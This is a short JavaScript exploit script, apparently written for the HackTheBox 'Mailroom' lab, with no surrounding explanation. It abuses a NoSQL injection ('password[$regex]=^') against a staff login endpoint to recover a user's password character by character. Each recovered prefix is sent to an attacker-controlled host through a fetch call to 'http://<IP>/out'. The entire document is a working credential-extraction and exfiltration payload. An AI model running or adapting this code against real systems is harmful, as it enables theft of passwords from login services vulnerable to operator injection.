async function callAuth(pass) {
    var http = new XMLHttpRequest();
    http.open('POST', "http://staff-review-panel.mailroom.htb/auth.php", true);
    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    http.onload = function () {
        if (/"success":true/.test(this.responseText)) {
            notify(pass);
            cal("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#%'()+, -/:;<=>@[\]_`{}~", pass);
        }
    };
    http.send("email=tristan@mailroom.htb&password[$regex]=^"+pass);
}
function notify(pass) {
    fetch("http://<IP>/out?" + pass);
}
var chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#%'()+, -/:;<=>@[\]_`{}~";
function cal(chars, pass) {
    for (var i = 0; i < chars.length; i++) {
        callAuth(pass+chars[i])
    }
}
cal(chars, "");